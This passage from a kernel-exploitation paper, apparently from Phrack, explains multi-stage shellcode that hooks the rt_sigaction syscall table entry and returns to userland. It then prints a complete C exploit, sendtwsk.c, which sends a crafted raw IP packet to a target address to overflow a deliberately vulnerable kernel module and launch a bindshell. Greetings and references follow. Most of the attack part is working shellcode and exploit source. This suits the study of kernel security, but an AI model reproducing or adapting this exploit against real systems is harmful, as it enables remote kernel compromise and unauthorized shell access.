 - scan the stack untill we find the 'start marker' of our stage-2 stub. 
   We put a \xaa byte at the start of it, and it's the only one present in
   the shellcode. The addl $10 is there just to start scanning after the
   'cmp $0xaa, %al', which would otherwise give a false positive for \xaa.

"\x83\xc1\x10"                 //  addl $10, %ecx
"\x41"                         //  inc    %ecx
"\x8a\x01"                     //  mov    (%ecx),%al
"\x3c\xaa"                     //  cmp    $0xaa,%al
"\x75\xf9"                     //  jne    52 <search+0x2a>

 - we have found the start of the shellcode, let's copy it in the 'safe
   place' untill the 'end marker' (\xbb). The 'safe place' here is saved
   inside the %esi register. We haven't shown how we calculated it because
   it directly derives from the shellcode used in the next section (it's
   simply somwhere in the stack space). This code could be optimized by
   saving the 'stage-2' stub size in %ecx and using rep/repnz in
   conjuction with mov instructions. 

"\x41"                         //  inc    %ecx
"\x8a\x01"                     //  mov    (%ecx),%al
"\x88\x06"                     //  mov    %al,(%esi)
"\x46"                         //  inc    %esi
"\x41"                         //  inc    %ecx
"\x80\x39\xbb"                 //  cmpb   $0xbb,(%ecx)
"\x75\xf5"                     //  jne    5a <search+0x32>
 
   [during the develop phase of the exploit we have changed a couple of
    times the 'stage-2' part, that's why we left that kind of copy
    operation, even if it's less elegant :) ]


---[ 3.2.5 - Executing Code in Userspace Context [Gimme Life!] 


Okay, we have a 'safe place', all we need now is a 'safe moment', that is
a process context to execute in. The first 'easy' solution that could come
to your mind could be overwriting the #128 software interrupt [int $0x80],
so that it points to our code. The first process issuing a system call
would thus become our 'victim process-context'.
This approach has, thou, two major drawbacks : 
   
  - we have no way to intercept processes using sysenter to access kernel
    space (what if all were using it ? It would be a pretty odd way to
    fail...) 

  - we can't control which process is 'hooked' and that might be
    'disastrous' if the process is the init one or a critical one,
    since we'll borrow its userspace to execute our shellcode (a bindshell
    or a connect-back is not a short-lasting process).  

We have to go a little more deeper inside the kernel to achieve a good
hooking. Our choice was to use the syscall table and to redirect a system
call which has an high degree of possibility to be called and that we're
almost sure that isn't used inside init or any critical process. 
Our choice, after a couple of tests, was to hook the rt_sigaction syscall,
but it's not the only one. It just worked pretty well for us. 

To locate correctly in memory the syscall table we use the stub of code
that sd and devik presented in their phrack paper [23] about /dev/kmem 
patching: 

 - we get the current stack address, calculate the start of the
   thread_struct and we add 0x1000 (pad gap) [simbolic value far enough
   from both the end of the thread_struct and the top of stack]. Here is
   where we set that %esi value that we have presented as 'magically
   already there' in the shellcode-part discussed before.

"\x89\xe6"                     //  mov    %esp,%esi
"\x81\xe6\x00\xe0\xff\xff"     //  and    $0xffffe000,%esi
"\x81\xc6\x00\x10\x00\x00"     //  add    $0x1000,%esi

 - sd & devik sligthly re-adapted code.
 

"\x0f\x01\x0e"                 //  sidtl  (%esi)
"\x8b\x7e\x02"                 //  mov    0x2(%esi),%edi
"\x81\xc7\x00\x04\x00\x00"     //  add    $0x400,%edi
"\x66\x8b\x5f\x06"             //  mov    0x6(%edi),%bx
"\xc1\xe3\x10"                 //  shl    $0x10,%ebx
"\x66\x8b\x1f"                 //  mov    (%edi),%bx
"\x43"                         //  inc    %ebx
"\x8a\x03"                     //  mov    (%ebx),%al
"\x3c\xff"                     //  cmp    $0xff,%al
"\x75\xf9"                     //  jne    28 <search>
"\x8a\x43\x01"                 //  mov    0x1(%ebx),%al
"\x3c\x14"                     //  cmp    $0x14,%al
"\x75\xf2"                     //  jne    28 <search>
"\x8a\x43\x02"                 //  mov    0x2(%ebx),%al
"\x3c\x85"                     //  cmp    $0x85,%al
"\x75\xeb"                     //  jne    28 <search>
"\x8b\x5b\x03"                 //  mov    0x3(%ebx),%ebx 


- logically we need to save the original address of the syscall somewhere,
  and we decided to put it just before the 'stage-2' shellcode : 

 "\x81\xc3\xb8\x02\x00\x00"     //  add 0x2b8, %ebx       
 "\x89\x5e\xf8"                 //  movl %ebx, 0xfffffff8(%esi) 
 "\x8b\x13"                     //  mov    (%ebx),%edx
 "\x89\x56\xfc"                 //  mov    %edx,0xfffffffc(%esi)
 "\x89\x33"                     //  mov    %esi,(%ebx)

As you see, we save the address of the rt_sigaction entry [offset 0x2b8]
inside syscall table (we will need it at restore time, so that we won't
have to calculate it again) and the original address of the function
itself (the above counterpart in the restoring phase). We make point the
rt_sigaction entry to our shellcode : %esi. Now it should be even clearer
why, in the previous section, we had ''magically'' the destination address
to copy our stub into in %esi.    

The first process issuing a rt_sigaction call will just give life to the
stage-2 shellcode, which is the final step before getting the connect-back
or the bindshell executed. [or whatever shellcode you like more ;) ]
We're still in kerneland, while our final goal is to execute an userland
shellcode, so we still have to perform a bounch of operations. 

There are basically two methods (not the only two, but probably the easier
and most effective ones) to achieve our goal : 

  - find saved EIP, temporary disable WP control register flag, copy
    the userland shellcode overthere and re-enable WP flag [it could be 
    potentially dangerous on SMP]. If the syscall is called through
    sysenter, the saved EIP points into vsyscall table, so we must 'scan'
    the stack 'untill ret' (not much different from what we do in the
    stack frame recovery step, just easier here), to get the real
    userspace saved EIP after vsyscall 'return' : 

    0xffffe410 <__kernel_vsyscall+16>:      pop    %ebp
    0xffffe411 <__kernel_vsyscall+17>:      pop    %edx
    0xffffe412 <__kernel_vsyscall+18>:      pop    %ecx
    0xffffe413 <__kernel_vsyscall+19>:      ret

    As you can see, the first executed userspace address (writable) is at
    saved *(ESP + 12).

  - find saved ESP or use syscall saved parameters pointing to an userspace
    buffer, copy the shellcode in that memory location and overwrite the
    saved EIP with saved ESP (or userland buffer address)

The second method is preferable (easier and safer), but if we're dealing
with an architecture supporting the NX-bit or with a software patch that
emulates the execute bit (to mark the stack and eventually the heap as
non-executable), we have to fallback to the first, more intrusive, method,
or our userland process will just segfault while attempting to execute the
shellcode. Since we do have full control of the process-related kernel 
data we can also copy the shellcode in a given place and modify page
protection. [not different from the idea proposed above for IDT read-only 
in the 'Copy the Stub' section]

Once again, let's go on with the dirty details : 

 - the usual call/pop trick to get the address we're executing from 

"\xe8\x00\x00\x00\x00"         //  call   8 <func+0x8>
"\x59"                         //  pop    %ecx
 
 - patch back the syscall table with the original rt_sigaction address
   [if those 0xff8 and 0xffc have no meaning for you, just remember that we 
    added 0x1000 to the thread_struct stack address to calculate our 'safe
    place' and that we stored just before both the syscall table entry 
    address of rt_sigaction and the function address itself]

"\x81\xe1\x00\xe0\xff\xff"     //  and    $0xffffe000,%ecx
"\x8b\x99\xf8\x0f\x00\x00"     //  mov    0xff8(%ecx),%ebx
"\x8b\x81\xfc\x0f\x00\x00"     //  mov    0xffc(%ecx),%eax
"\x89\x03"                     //  mov    %eax,(%ebx)

 - locate Userland ESP and overwrite Userland EIP with it [method 2] 

"\x8b\x74\x24\x38"             //  mov    0x38(%esp),%esi
"\x89\x74\x24\x2c"             //  mov    %esi,0x2c(%esp)
"\x31\xc0"                     //  xor    %eax,%eax

 - once again we use a marker (\x22) to locate the shellcode we want to
   copy on process stack. Let's call it 'stage-3' shellcode. 
   We use just another simple trick here to locate the marker and avoid a
   false positive : instead of jumping after (as we did for the \xaa one)
   we set the '(marker value) - 1' in %al and then increment it. 
   The copy is exactly the same (with the same 'note') we saw before 

"\xb0\x21"                     //  mov    $0x21,%al
"\x40"                         //  inc    %eax
"\x41"                         //  inc    %ecx
"\x38\x01"                     //  cmp    %al,(%ecx)
"\x75\xfb"                     //  jne    2a <func+0x2a>
"\x41"                         //  inc    %ecx
"\x8a\x19"                     //  mov    (%ecx),%bl
"\x88\x1e"                     //  mov    %bl,(%esi)
"\x41"                         //  inc    %ecx
"\x46"                         //  inc    %esi
"\x38\x01"                     //  cmp    %al,(%ecx)
"\x75\xf6"                     //  jne    30 <func+0x30>

 - return from the syscall and let the process cleanly exit to userspace.
   Control will be transfered to our modified EIP and shellcode will be
   executed

"\xc3"                         //  ret


We have used a 'fixed' value to locate userland ESP/EIP, which worked well
for the 'standard' kernels/apps we tested it on (getting to the syscall via 
int $0x80). With a little more effort (worth the time) you can avoid those
offset assumptions by implementing a code similar to the one for the Stack
Frame Recovery tecnique. 
Just take a look to how current userland EIP,ESP,CS and SS are saved
before jumping at kernel level :

ring0 stack:
+--------+
| SS     |  
| ESP    |  <--- saved ESP
| EFLAG  |
| CS     |  
| EIP    |  <--- saved EIP
|......  |
+--------+

All 'unpatched' kernels will have the same value for SS and CS and we can
use it as a fingerprint to locate ESP and EIP (that we can test to be
below PAGE_OFFSET [*]) 

[*] As we already said, on latest kernels there could be a different
    uspace/kspace split address than 0xc0000000 [2G/2G or 1G/3G 
    configurations]

We won't show here the 'stage-3' shellcode since it is a standard
'userland' bindshell one. Just use the one you need depending on the
environment. 


---[ 3.2.6 - The Code : sendtwsk.c


< stuff/expl/sendtwsk.c > 

#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

/* from vuln module */
#define MAX_TWSKCHUNK 30
/* end */

#define NOP 0x90

#define OVERFLOW_NEED   20

#define JMP           "\xe9\x07\xfe\xff\xff"
#define SIZE_JMP      (sizeof(JMP) -1)

#define TWSK_PACKET_LEN (((MAX_TWSKCHUNK * sizeof(struct twsk_chunk)) +
OVERFLOW_NEED) + SIZE_JMP \
                         + sizeof(struct twsk) + sizeof(struct iphdr))

#define TWSK_PROTO 37


#define DEFAULT_VSYSCALL_RET 0xffffe413
#define DEFAULT_VSYSCALL_JMP 0xc01403c0

/*
 *  find the correct value..
alpha:/usr/src/linux/debug/article/remote/figaro/ip_figaro# ./roll
val: 2147483680, 80000020 result: 512
val: 2147483681, 80000021 result: 528
*/

#define NEGATIVE_CHUNK_NUM 0x80000020

char shellcode[]=
/* hook sys_rtsigaction() and copy the 2level shellcode (72) */

 "\x90\x90"                     //  nop; nop; [alignment]
 "\x89\xe6"                     //  mov    %esp,%esi
 "\x81\xe6\x00\xe0\xff\xff"     //  and    $0xffffe000,%esi
 "\x81\xc6\x00\x10\x00\x00"     //  add    $0x1000,%esi
 "\x0f\x01\x0e"                 //  sidtl  (%esi)
 "\x8b\x7e\x02"                 //  mov    0x2(%esi),%edi
 "\x81\xc7\x00\x04\x00\x00"     //  add    $0x400,%edi
 "\x66\x8b\x5f\x06"             //  mov    0x6(%edi),%bx
 "\xc1\xe3\x10"                 //  shl    $0x10,%ebx
 "\x66\x8b\x1f"                 //  mov    (%edi),%bx
 "\x43"                         //  inc    %ebx
 "\x8a\x03"                     //  mov    (%ebx),%al
 "\x3c\xff"                     //  cmp    $0xff,%al
 "\x75\xf9"                     //  jne    28 <search>
 "\x8a\x43\x01"                 //  mov    0x1(%ebx),%al
 "\x3c\x14"                     //  cmp    $0x14,%al
 "\x75\xf2"                     //  jne    28 <search>
 "\x8a\x43\x02"                 //  mov    0x2(%ebx),%al
 "\x3c\x85"                     //  cmp    $0x85,%al
 "\x75\xeb"                     //  jne    28 <search>
 "\x8b\x5b\x03"                 //  mov    0x3(%ebx),%ebx [get
sys_call_table]

 "\x81\xc3\xb8\x02\x00\x00"     //  add 0x2b8, %ebx       [get
sys_rt_sigaction offset]
 "\x89\x5e\xf8"                 //  movl %ebx, 0xfffffff8(%esi) [save
sys_rt_sigaction]

 "\x8b\x13"                     //  mov    (%ebx),%edx
 "\x89\x56\xfc"                 //  mov    %edx,0xfffffffc(%esi)
 "\x89\x33"                     //  mov    %esi,(%ebx)    [make
sys_rt_sigaction point to our shellcode]

 "\xe8\x00\x00\x00\x00"         //  call   51 <search+0x29>
 "\x59"                         //  pop    %ecx
 "\x83\xc1\x10"                 //  addl $10, %ecx
 "\x41"                         //  inc    %ecx
 "\x8a\x01"                     //  mov    (%ecx),%al
 "\x3c\xaa"                     //  cmp    $0xaa,%al
 "\x75\xf9"                     //  jne    52 <search+0x2a>
 "\x41"                         //  inc    %ecx
 "\x8a\x01"                     //  mov    (%ecx),%al
 "\x88\x06"                     //  mov    %al,(%esi)
 "\x46"                         //  inc    %esi
 "\x41"                         //  inc    %ecx
 "\x80\x39\xbb"                 //  cmpb   $0xbb,(%ecx)
 "\x75\xf5"                     //  jne    5a <search+0x32>

/* find and decrement preempt counter (32) */

 "\x89\xe0"                     //  mov %esp,%eax
 "\x25\x00\xe0\xff\xff"         //  and $0xffffe000,%eax
 "\x83\xc0\x04"                 //  add $0x4,%eax
 "\x8b\x18"                     //  mov (%eax),%ebx
 "\x83\xfb\xff"                 //  cmp $0xffffffff,%ebx
 "\x74\x0a"                     //  je 804851e <end>
 "\x81\xfb\x00\x00\x00\xc0"     //  cmp $0xc0000000,%ebx
 "\x74\x02"                     //  je 804851e <end>
 "\xeb\xec"                     //  jmp 804850a <scan>
 "\xff\x48\xfc"                 //  decl 0xfffffffc(%eax)

/* stack frame recovery step */

 "\x58"                         //  pop    %eax
 "\x83\x3c\x24\x02"             //  cmpl   $0x2,(%esp)
 "\x75\xf9"                     //  jne    8048330 <do_unroll>
 "\x83\x7c\x24\x04\x01"         //  cmpl   $0x1,0x4(%esp)
 "\x75\xf2"                     //  jne    8048330 <do_unroll>
 "\x83\x7c\x24\x10\x00"         //  cmpl   $0x0,0x10(%esp)
 "\x75\xeb"                     //  jne    8048330 <do_unroll>
 "\x8d\x64\x24\xfc"             //  lea    0xfffffffc(%esp),%esp

 "\x8b\x04\x24"                 //  mov    (%esp),%eax
 "\x89\xc3"                     //  mov    %eax,%ebx
 "\x03\x43\xfc"                 //  add    0xfffffffc(%ebx),%eax
 "\x40"                         //  inc    %eax
 "\x8a\x18"                     //  mov    (%eax),%bl
 "\x80\xfb\xc3"                 //  cmp    $0xc3,%bl
 "\x75\xf8"                     //  jne    8048351 <do_unroll+0x21>
 "\x80\x78\xff\x88"             //  cmpb   $0x88,0xffffffff(%eax)
 "\x74\xf2"                     //  je     8048351 <do_unroll+0x21>
 "\x80\x78\xff\x89"             //  cmpb   $0x89,0xffffffff(%eax)
 "\x74\xec"                     //  je     8048351 <do_unroll+0x21>
 "\x31\xc9"                     //  xor    %ecx,%ecx
 "\x48"                         //  dec    %eax
 "\x8a\x18"                     //  mov    (%eax),%bl
 "\x80\xe3\xf0"                 //  and    $0xf0,%bl
 "\x80\xfb\x50"                 //  cmp    $0x50,%bl
 "\x75\x03"                     //  jne    8048375 <do_unroll+0x45>
 "\x41"                         //  inc    %ecx
 "\xeb\xf2"                     //  jmp    8048367 <do_unroll+0x37>
 "\x40"                         //  inc    %eax
 "\x89\xc6"                     //  mov    %eax,%esi
 "\x31\xc0"                     //  xor    %eax,%eax
 "\xb0\x04"                     //  mov    $0x4,%al
 "\xf7\xe1"                     //  mul    %ecx
 "\x29\xc4"                     //  sub    %eax,%esp
 "\x31\xc0"                     //  xor    %eax,%eax
 "\xff\xe6"                     //  jmp    *%esi

/* end of stack frame recovery */

/* stage-2 shellcode */

 "\xaa"                         //  border stage-2 start

 "\xe8\x00\x00\x00\x00"         //  call   8 <func+0x8>
 "\x59"                         //  pop    %ecx
 "\x81\xe1\x00\xe0\xff\xff"     //  and    $0xffffe000,%ecx
 "\x8b\x99\xf8\x0f\x00\x00"     //  mov    0xff8(%ecx),%ebx
 "\x8b\x81\xfc\x0f\x00\x00"     //  mov    0xffc(%ecx),%eax
 "\x89\x03"                     //  mov    %eax,(%ebx)
 "\x8b\x74\x24\x38"             //  mov    0x38(%esp),%esi
 "\x89\x74\x24\x2c"             //  mov    %esi,0x2c(%esp)
 "\x31\xc0"                     //  xor    %eax,%eax
 "\xb0\x21"                     //  mov    $0x21,%al
 "\x40"                         //  inc    %eax
 "\x41"                         //  inc    %ecx
 "\x38\x01"                     //  cmp    %al,(%ecx)
 "\x75\xfb"                     //  jne    2a <func+0x2a>
 "\x41"                         //  inc    %ecx
 "\x8a\x19"                     //  mov    (%ecx),%bl
 "\x88\x1e"                     //  mov    %bl,(%esi)
 "\x41"                         //  inc    %ecx
 "\x46"                         //  inc    %esi
 "\x38\x01"                     //  cmp    %al,(%ecx)
 "\x75\xf6"                     //  jne    30 <func+0x30>
 "\xc3"                         //  ret

 "\x22"                         //  border stage-3 start

 "\x31\xdb"                     //  xor    ebx, ebx
 "\xf7\xe3"                     //  mul    ebx
 "\xb0\x66"                     //  mov     al, 102
 "\x53"                         //  push    ebx
 "\x43"                         //  inc     ebx
 "\x53"                         //  push    ebx
 "\x43"                         //  inc     ebx
 "\x53"                         //  push    ebx
 "\x89\xe1"                     //  mov     ecx, esp
 "\x4b"                         //  dec     ebx
 "\xcd\x80"                     //  int     80h
 "\x89\xc7"                     //  mov     edi, eax
 "\x52"                         //  push    edx
 "\x66\x68\x4e\x20"             //  push    word 8270
 "\x43"                         //  inc     ebx
 "\x66\x53"                     //  push    bx
 "\x89\xe1"                     //  mov     ecx, esp
 "\xb0\xef"                     //  mov    al, 239
 "\xf6\xd0"                     //  not    al
 "\x50"                         //  push    eax
 "\x51"                         //  push    ecx
 "\x57"                         //  push    edi
 "\x89\xe1"                     //  mov     ecx, esp
 "\xb0\x66"                     //  mov     al, 102
 "\xcd\x80"                     //  int     80h
 "\xb0\x66"                     //  mov     al, 102
 "\x43"                         //  inc    ebx
 "\x43"                         //  inc    ebx
 "\xcd\x80"                     //  int     80h
 "\x50"                         //  push    eax
 "\x50"                         //  push    eax
 "\x57"                         //  push    edi
 "\x89\xe1"                     //  mov    ecx, esp
 "\x43"                         //  inc    ebx
 "\xb0\x66"                     //  mov    al, 102
 "\xcd\x80"                     //  int    80h
 "\x89\xd9"                     //  mov    ecx, ebx
 "\x89\xc3"                     //  mov     ebx, eax
 "\xb0\x3f"                     //  mov     al, 63
 "\x49"                         //  dec     ecx
 "\xcd\x80"                     //  int     80h
 "\x41"                         //  inc     ecx
 "\xe2\xf8"                     //  loop    lp
 "\x51"                         //  push    ecx
 "\x68\x6e\x2f\x73\x68"         //  push    dword 68732f6eh
 "\x68\x2f\x2f\x62\x69"         //  push    dword 69622f2fh
 "\x89\xe3"                     //  mov     ebx, esp
 "\x51"                         //  push    ecx
 "\x53"                         //  push    ebx
 "\x89\xe1"                     //  mov    ecx, esp
 "\xb0\xf4"                     //  mov    al, 244
 "\xf6\xd0"                     //  not    al
 "\xcd\x80"                     //  int     80h


 "\x22"                         //  border stage-3 end

 "\xbb";                        //  border stage-2 end

/* end of shellcode */


struct twsk_chunk
{
  int type;
  char buff[12];
};

struct twsk
{
  int chunk_num;
  struct twsk_chunk chunk[0];
};


void fatal_perror(const char *issue)
{
  perror("issue");
  exit(1);
}

void fatal(const char *issue)
{
  perror("issue");
  exit(1);
}

/* packet IP cheksum */
unsigned short csum(unsigned short *buf, int nwords)
{
        unsigned long sum;
        for(sum=0; nwords>0; nwords--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return ~sum;
}


void prepare_packet(char *buffer)
{
  unsigned char *ptr = (unsigned char *)buffer;;
  unsigned int i;
  unsigned int left;

  left = TWSK_PACKET_LEN - sizeof(struct twsk) - sizeof(struct iphdr);
  left -= SIZE_JMP;
  left -= sizeof(shellcode)-1;

  ptr += (sizeof(struct twsk)+sizeof(struct iphdr));

  memset(ptr, 0x00, TWSK_PACKET_LEN);
  memcpy(ptr, shellcode, sizeof(shellcode)-1); /* shellcode must be 4
bytes aligned */

  ptr += sizeof(shellcode)-1;

  for(i=1; i < left/4; i++, ptr+=4)
        *((unsigned int *)ptr) = DEFAULT_VSYSCALL_RET;

  *((unsigned int *)ptr) = DEFAULT_VSYSCALL_JMP;
  ptr+=4;

  printf("buffer=%p, ptr=%p\n", buffer, ptr);
  strcpy(ptr, JMP); /* jmp -500 */

}


int main(int argc, char *argv[])
{
        int sock;
        struct sockaddr_in sin;
        int one = 1;
        const int *val = &one;

        printf("shellcode size: %d\n", sizeof(shellcode)-1);

        char *buffer = malloc(TWSK_PACKET_LEN);
        if(!buffer)
          fatal_perror("malloc");

        prepare_packet(buffer);

        struct iphdr *ip = (struct iphdr *) buffer;
        struct twsk *twsk = (struct twsk *) (buffer + sizeof(struct
iphdr));


        if(argc < 2)
        {
          printf("Usage: ./sendtwsk ip");
          exit(-1);
        }


        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0)
                fatal_perror("socket");

        sin.sin_family = AF_INET;
        sin.sin_port = htons(12345);
        sin.sin_addr.s_addr = inet_addr(argv[1]);

        /* ip packet */
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 16;
        ip->tot_len = TWSK_PACKET_LEN;
        ip->id = htons(12345);
        ip->ttl = 64;
        ip->protocol = TWSK_PROTO;
        ip->saddr = inet_addr("192.168.200.1");
        ip->daddr = inet_addr(argv[1]);
        twsk->chunk_num = NEGATIVE_CHUNK_NUM;
        ip->check = csum((unsigned short *) buffer, TWSK_PACKET_LEN);

        if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
          fatal_perror("setsockopt");

        if (sendto(sock, buffer, ip->tot_len, 0, (struct sockaddr *) &sin,
sizeof(sin)) < 0)
          fatal_perror("sendto");

        return 0;
}

< / >

 
------[ 4 - Final words 


With the remote exploiting discussion ends that paper. We have presented
different scenarios and different exploiting tecniques and 'notes' that we
hope you'll find somehow useful. This paper was a sort of sum up of the
more general approaches we took in those years of 'kernel exploiting'. 

As we said at the start of the paper, the kernel is a big and large beast,
which offers many different points of 'attack' and which has more severe
constraints than the userland exploiting. It is also 'relative new' and
improvements (and new logical or not bugs) are getting out. 
At the same time new countermeasures come out to make our 'exploiting
life' harder and harder. 

The first draft of this paper was done some months ago, so we apologies if
some of the information here present could be outdated (or already
presented somewhere else and not properly referenced). We've tried to add
a couple of comments around the text to point out the most important
recent changes.  

So, this is the end, time remains just for some greets. Thank you for
reading so far, we hope you enjoyed the whole work. 

A last minute shotout goes to bitsec guys, who performed a cool talk 
about kernel exploiting at BlackHat conference [24]. Go check their
paper/exploits for examples and covering of *BSD and Windows systems.

Greetz and thanks go, in random order, to :  

sgrakkyu: darklady(:*), HTB, risk (Arxlab), recidjvo (for netfilter
tricks), vecna (for being vecna:)).

twiz: lmbdwr, ga, sd, karl, cmn, christer, koba, smaster, #dnerds & 
#elfdev people for discussions, corrections, feedbacks and just long
'evening/late night' talks.
A last shotout to akira, sanka, metal_militia and yhly for making the
monday evening a _great_ evening [and for all the beers offered :-) ]. 


------[ 5 - References


[1] - Intel Architecture Reference Manuals
      http://www.intel.com/products/processor/manuals/index.htm

[2] - SPARC V9 Architecture 
      http://www.sparc.com/standards/SPARCV9.pdf

[3] - AMD64 Reference Manuals
      http://www.amd.com/it-it/Processors/
      ProductInformation/0,,30_118_4699_875^7044,00.html

[4] - MCAST_MSFILTER iSEC's advisory  
      http://www.isec.pl/vulnerabilities/isec-0015-msfilter.txt

[5] - sendmsg local buffer overflow
      http://www.securityfocus.com/bid/14785

[6] - kad, "Handling Interrupt Descriptor Table for fun and profit"
      https://phrack.org/issues/59/4.html#article 

[7] - iSEC Security Research
      http://www.isec.pl

[8] - Jeff Bonwick, "The Slab Allocator: An Object-Caching Kernel Memory
      Allocator"
      http://www.usenix.org/publications/library/proceedings/
      bos94/bonwick.html

[9] - Daniel P. Bovet & Marco Cesati
      "Understanding the Linux Kernel", 3rd Edition [ISBN 0-596-00565-2]

[10] - Richard McDougall and Jim Mauro
       "Solaris Internals" , 2nd Edition [ISBN 0-13-148209-2]

[11] - Mel Gorman, "Linux VM Documentation" 
       http://www.skynet.ie/~mel/projects/vm/

[12] - sd, krad exploit for sys_epoll vulnerability
       http://www.securiteam.com/exploits/5VP0N0UF5U.html

[13] - noir, "Smashing The Kernel Stack For Fun And Profit" 
       https://phrack.org/issues/60/6.html#article

[14] - UltraSPARC User's Manuals 
       http://www.sun.com/processors/documentation.html

[15] - pr1, "Exploiting SPARC Buffer Overflow vulnerabilities"
       http://www.emsi.it.pl/sploits/solaris/sparcoverflow.html

[16] - horizon, Defeating Solaris/SPARC Non-Executable Stack Protection
       http://www.emsi.it.pl/sploits/solaris/horizon.html

[17] - Gavin Maltby's Sun Weblog, "SPARC System Calls" 
       http://blogs.sun.com/gavinm/entry/sparc_system_calls

[18] - PaX project 
       http://pax.grsecurity.net 	    

[19] - Solar Designer, "Getting around non-executable stack (and fix)" 
       http://insecure.org/sploits/linux.libc.return.lpr.sploit.html

[20] - Sebastian Krahmer, "x86-64 buffer overflow exploits and the
       borrowed code chunks exploitation technique"
       http://www.suse.de/~krahmer/no-nx.pdf 

[21] - Laurent BUTTI, Jerome RAZNIEWSKI & Julien TINNES
       "Madwifi SIOCGIWSCAN buffer overflow"
       http://lists.grok.org.uk/pipermail/full-disclosure/2006-December
       /051176.html

[22] - sgrakkyu, "madwifi linux remote kernel exploit"
       http://www.milw0rm.com/exploits/3389

[23] - sd & devik, "Linux on-the-fly kernel patching without LKM" 
       https://phrack.org/issues/58/7.html#article

[24] - Joel Eriksson, Karl Janmar & Christer berg, "Kernel Wars"
       https://www.blackhat.com/presentations/bh-eu-07/Eriksson-Janmar
       /Whitepaper/bh-eu-07-eriksson-WP.pdf


------[ 6 - Sources - drivers and exploits [stuff.tgz]


